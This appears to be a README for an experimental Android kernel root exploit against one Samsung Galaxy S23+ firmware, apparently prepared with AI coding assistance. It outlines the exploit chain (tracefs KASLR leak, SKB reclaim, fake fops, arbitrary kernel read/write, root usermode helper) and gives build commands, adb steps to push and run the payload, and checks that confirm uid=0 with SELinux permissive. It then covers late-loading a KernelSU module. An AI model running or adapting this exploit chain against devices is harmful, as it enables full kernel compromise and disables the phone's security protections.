# Experimental SM-S916B FZG1 payload

This payload is for Galaxy S23+ `SM-S916B` running firmware `S916BXXSAFZG1` and kernel `5.15.189-android13-8-33413713-abS916BXXSAFZG1` only.

The MCAST build completed the full chain once on real hardware: tracefs KASLR discovery, controlled `mm_struct` collection, shaped SKB reclaim, fake fops, configfs ARW, pipe physical read/write, and root UMH. The final root client reported `uid=0`, `u:r:kernel:s0`, and SELinux permissive.

This profile is experimental and is not listed in the Root My Galaxy support feed. The proven launch context is `adb shell` (`uid=2000`, `u:r:shell:s0`). A normal APK process cannot use the required tracefs path. An APK frontend would need to delegate the runner to an ADB-shell or Shizuku shell service; that integration is not part of this PR.

SIGRETURN is not offered for this target. It completed the waiter write and fake-fops gates on hardware, but the phone then froze at the first pipe stage and required a forced reboot. The build is fixed to the hardware-proven MCAST writer.

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `020a7acbe454292fed60e59dce179af8591a3bd2a8f3ec638ce2858794047951` |
| `../../kernelsu/android13-5.15.189_kernelsu-dm2q-S916BXXSAFZG1.ko` | `0c6902794e13c4727cf69c4039080b241760684a1aae929d380c4aa492ca9e84` |
| `../../kernelsu/ksud-dm2q-S916BXXSAFZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` |

## Build

```sh
make TARGET=dm2q-S916BXXSAFZG1 ANDROID_NDK_HOME=/path/to/android-ndk
```

Use these outputs:

```text
build/dm2q-S916BXXSAFZG1/cve-2026-43499-app.so
build/dm2q-S916BXXSAFZG1/cve-2026-43499-root
```

## ADB shell test

Wait about one minute after boot, then push the payload and runner:

```cmd
adb push cve-2026-43499-app.so /data/local/tmp/dm2q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root"
adb shell "sha256sum /data/local/tmp/dm2q.so"
```

Run one attempt:

```cmd
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm2q.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm2q-fzg1-shaped-mcast.log"
```

Do not start another attempt on the same boot after the stack-writer stage. A failed post-writer attempt can leave PI state behind.

Verify root:

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; whoami; getenforce'"
```

Expected output:

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root
Permissive
```

## Experimental KernelSU late-load

The standalone KernelSU module was built from Samsung's exact FZG1 source with the live config and matching clang. Its 200 imports all exist in the recovered FZG1 kernel. It has an empty `__versions` section for the kallsyms-aware manual loader, disables live text patching, and hard-stops the RKP syscall-table write. Plain `insmod` is not supported. Test through the root helper's `--late-load` wrapper, which invokes the matched `ksud` in a private mount namespace and verifies the KernelSU control fd.

Push the late-load binary. The standalone `.ko` is included for audit and manual-loader debugging; the normal `--late-load` path uses the KMI module embedded in `ksud`.

```cmd
adb push ksud-dm2q-S916BXXSAFZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp"
adb shell "sha256sum /data/local/tmp/ksud-s25u-kdp"
```

Stage `ksud` and run the guarded late-load once:

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
```

Expected output contains `KernelSU control verified version=... flags=...`. Check the module:

```cmd
adb shell "/data/local/tmp/cve-2026-43499-root -c 'grep kernelsu /proc/modules; dmesg | tail -80'"
```

If `/proc/modules` contains `kernelsu`, verify the shell path:

```cmd
adb shell "su -c id"
```

Do not repeat a direct `ksud insmod` call if it prints only `Killed`. Loading the module can change the loader's security domain before its old stdout/stderr fds are safe. First check `/proc/modules`; the guarded `--late-load` path exists to handle this transition.

The KernelSU ABI checks are complete, but module initialization has not yet been tested on real S916B FZG1 hardware. Samsung RKP/KDP hook setup can still reboot the phone. Make one attempt and collect dumpstate if it fails.

Both root and KernelSU are volatile. A reboot removes them.

## Authorship

This experimental port and documentation were prepared with OpenAI Codex assistance. Hardware execution and logs were supplied by `@manups4e`.
